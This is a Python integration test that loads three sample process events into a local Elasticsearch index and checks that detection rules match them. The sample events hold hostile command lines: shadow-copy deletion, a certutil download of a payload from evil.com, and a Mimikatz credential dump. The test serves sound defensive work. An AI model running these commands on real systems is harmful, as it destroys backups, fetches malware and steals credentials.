import sys
import time
import requests

ES = "http://localhost:9200"
INDEX = "logs-test"

MAPPING = {
    "mappings": {
        "properties": {
            "@timestamp": {"type": "date"},
            "process.name": {"type": "keyword"},
            "process.command_line": {"type": "keyword"},
            "event.category": {"type": "keyword"},
            "event.type": {"type": "keyword"},
        }
    }
}

EVENTS = [
    {
        "@timestamp": "2024-01-01T00:00:00Z",
        "process.name": "vssadmin.exe",
        "process.command_line": "vssadmin delete shadows /all /quiet",
        "event.category": "process",
        "event.type": "start",
    },
    {
        "@timestamp": "2024-01-01T00:01:00Z",
        "process.name": "certutil.exe",
        "process.command_line": "certutil -urlcache -split -f http://evil.com/payload.exe",
        "event.category": "process",
        "event.type": "start",
    },
    {
        "@timestamp": "2024-01-01T00:02:00Z",
        "process.name": "mimikatz.exe",
        "process.command_line": "mimikatz.exe sekurlsa::logonpasswords",
        "event.category": "process",
        "event.type": "start",
    },
]

RULES = [
    {
        "name": "Shadow Copy Deletion",
        "query": {"bool": {"must": [
            {"term": {"process.name": "vssadmin.exe"}},
            {"wildcard": {"process.command_line": "*delete shadows*"}},
        ]}},
    },
    {
        "name": "Certutil URL Download",
        "query": {"bool": {"must": [
            {"term": {"process.name": "certutil.exe"}},
            {"wildcard": {"process.command_line": "*urlcache*"}},
        ]}},
    },
    {
        "name": "Mimikatz Execution",
        "query": {"term": {"process.name": "mimikatz.exe"}},
    },
]


def main():
    # Create index
    r = requests.put(f"{ES}/{INDEX}", json=MAPPING)
    if r.status_code not in (200, 201):
        print(f"FAIL: create index: {r.text}")
        return 1

    # Inject events
    for i, event in enumerate(EVENTS):
        r = requests.post(f"{ES}/{INDEX}/_doc", json=event)
        if r.status_code not in (200, 201):
            print(f"FAIL: inject event {i}: {r.text}")
            return 1

    # Refresh to make docs searchable
    requests.post(f"{ES}/{INDEX}/_refresh")
    time.sleep(1)

    # Verify rules match
    failures = 0
    for rule in RULES:
        r = requests.post(f"{ES}/{INDEX}/_search", json={"query": rule["query"]})
        hits = r.json().get("hits", {}).get("total", {}).get("value", 0)
        if hits == 0:
            print(f"FAIL: '{rule['name']}' matched 0 events")
            failures += 1
        else:
            print(f"PASS: '{rule['name']}' matched {hits} event(s)")

    if failures:
        print(f"\n{failures} rule(s) failed")
        return 1

    print("\nAll integration tests passed")
    return 0


if __name__ == "__main__":
    sys.exit(main())
